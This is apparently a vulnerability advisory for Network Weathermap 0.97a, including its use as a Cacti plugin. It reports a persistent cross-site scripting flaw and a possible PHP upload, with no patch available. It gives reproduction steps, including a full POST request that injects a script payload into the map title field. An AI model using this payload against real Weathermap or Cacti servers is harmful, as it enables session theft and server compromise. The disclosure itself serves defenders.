OVERVIEW

Network Weathermap 0.97a is vulnerable to a persistent XSS when displaying
available files.

INTRODUCTION

Network Weathermap is a network visualisation tool, to take data you
already have and show you an overview of your network in map form.
Support is built in for RRD, MRTG (RRD and old log-format), and
tab-delimited text files. Other sources are via plugins or external scripts.

VULNERABILITY DESCRIPTION

The vulnerability happens when a user injects HTML and Javascript into the
title of a map in editor.php. This title is later shown to the user when
listing the files in editor.php?action=newfile

Besides the title, other fields also allow an attacker to upload malicious
PHP code to a webserver, which can later be executed if the attacker has
direct acess to that file.

This application is often used as a plugin for Cacti. The vulnerability can
be exploited in this mode as well, in
weathermap-cacti-plugin-mgmt.php?action=viewconfig&file=<affected_file> and
it can be used to exploit Cacti.

To test it, simply create a map or edit an existing one:
GET editor.php?mapname=test&action=newmap

Then edit the map title with the payload:
POST editor.php
plug=0&mapname=test&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&link_commentin=&link_commentposin=95&link_commentout=&link_commentposout=5&map_title=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&map_legend=Traffic+Load&map_stamp=Created%3A+%25b+%25d+%25Y+%25H%3A%25M%3A%25S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=&editorsettings_showvias=0&editorsettings_showrelative=0&editorsettings_gridsnap=NO

Then display the titles:
GET editor.php

VERSIONS AFFECTED

Tested with version 0.97a (current release) but earlier versions are
possibly vulnerable.

SOLUTION

There is no official patch currently available.
